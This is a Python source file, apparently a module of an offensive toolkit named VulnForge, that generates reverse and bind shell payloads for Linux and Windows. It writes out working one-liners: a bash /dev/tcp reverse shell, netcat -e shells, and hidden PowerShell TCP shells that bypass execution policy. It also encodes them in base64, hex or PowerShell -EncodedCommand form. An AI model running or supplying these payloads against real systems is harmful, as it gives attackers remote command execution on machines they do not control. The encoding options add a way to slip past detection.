"""
VulnForge Module : Payload Generator
Generate various payloads (reverse shell, bind shell, etc.)
"""

from datetime import datetime
import base64
import urllib.parse

class PayloadGeneratorModule:
    def __init__(self):
        self.results = {
            "module": "payload_generator",
            "timestamp": datetime.now().isoformat(),
            "payloads": [],
            "output": ""
        }

    def run(self, payload_type="reverse", lhost="127.0.0.1", lport=4444, format="raw", target_os="linux"):
        """
        Generate a payload.
        - payload_type : "reverse", "bind"
        - lhost : listener IP
        - lport : listener port
        - format : "raw", "base64", "hex", "powershell", "bash"
        - target_os : "linux", "windows"
        """
        print(f"[*] Generating {payload_type} payload (LHOST={lhost}, LPORT={lport})...")

        if payload_type == "reverse":
            payload = self._generate_reverse(lhost, lport, target_os)
        elif payload_type == "bind":
            payload = self._generate_bind(lport, target_os)
        else:
            return {"error": f"Unknown payload type: {payload_type}"}

        # Format the payload
        formatted_payload = self._format_payload(payload, format, target_os)

        self.results["payloads"].append({
            "type": payload_type,
            "os": target_os,
            "format": format,
            "payload": formatted_payload
        })

        self.results["output"] = f"Generated {payload_type} payload for {target_os} ({format})"
        print(f"    [+] Payload generated successfully")
        print(f"    [i] Payload:\n{formatted_payload[:200]}..." if len(formatted_payload) > 200 else f"    [i] Payload:\n{formatted_payload}")

        return self.results

    def _generate_reverse(self, lhost, lport, target_os):
        """Generate reverse shell payload"""
        if target_os == "linux":
            return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        elif target_os == "windows":
            return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        else:
            return f"nc {lhost} {lport} -e /bin/bash"

    def _generate_bind(self, lport, target_os):
        """Generate bind shell payload"""
        if target_os == "linux":
            return f"nc -lvp {lport} -e /bin/bash"
        elif target_os == "windows":
            return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{lport});$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()\""
        else:
            return f"nc -lvp {lport} -e /bin/sh"

    def _format_payload(self, payload, format, target_os):
        """Format payload according to requested format"""
        if format == "raw":
            return payload
        elif format == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif format == "hex":
            return payload.encode().hex()
        elif format == "powershell" and target_os == "windows":
            # Encode PowerShell payload in base64 for -EncodedCommand
            encoded = base64.b64encode(payload.encode('utf-16le')).decode()
            return f"powershell -EncodedCommand {encoded}"
        elif format == "bash" and target_os == "linux":
            return f"bash -c '{payload}'"
        else:
            return payload
